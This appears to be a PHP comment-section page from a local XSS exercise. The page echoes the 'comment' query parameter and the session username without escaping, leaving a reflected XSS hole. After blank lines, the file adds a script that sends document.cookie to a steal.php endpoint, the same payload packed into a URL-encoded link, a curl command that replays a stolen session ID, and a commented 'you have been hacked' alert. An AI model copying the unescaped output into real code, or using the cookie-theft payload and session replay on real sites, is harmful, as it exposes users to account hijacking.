<?php session_start(); 
if (!$_SESSION['username']) {
    header("Location: index.php");
    exit();
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comment Section</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">
    <div class="container py-5">
        <div class="card shadow">
            <div class="card-header bg-primary text-white">
                <h1 class="h3 text-center mb-0">Comment Section</h1>
            </div>
            <div class="card-body">
                <h2 class="h4 mb-3">Welcome, <?php echo $_SESSION['username']; ?></h2>
                <form method="GET" action="">
                    <div class="mb-3">
                        <textarea name="comment" class="form-control" rows="4" placeholder="Write your comment"></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary">Submit</button>
                </form>
            </div>
        </div>

        <div class="mt-4">
            <h2 class="h4 mb-3">Comments:</h2>
            <?php if (isset($_GET['comment'])): ?>
    <div class="alert alert-info">
        <?php echo $_GET['comment']; ?>
    </div>
<?php endif; ?>

        </div>

        <div class="mt-4">
            <a href="logout.php" class="btn btn-danger">Logout</a> 
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>











<script>     fetch('http://localhost/PSJ/steal.php/steal.php?cookie=' + document.cookie); </script>
http://localhost/PSJ/dashboard.php?comment=%3Cscript%3E+++++fetch%28%27http%3A%2F%2Flocalhost%2FPSJ%2Fsteal.php%2Fsteal.php%3Fcookie%3D%27+%2B+document.cookie%29%3B+%3C%2Fscript%3E

<!-- curl -b "622rck31ri8hr9armba6fi5smc" http://localhost/PSJ/dashboard.php -->


<!-- <script>
    alert('Anda telah diretas!');
</script> -->

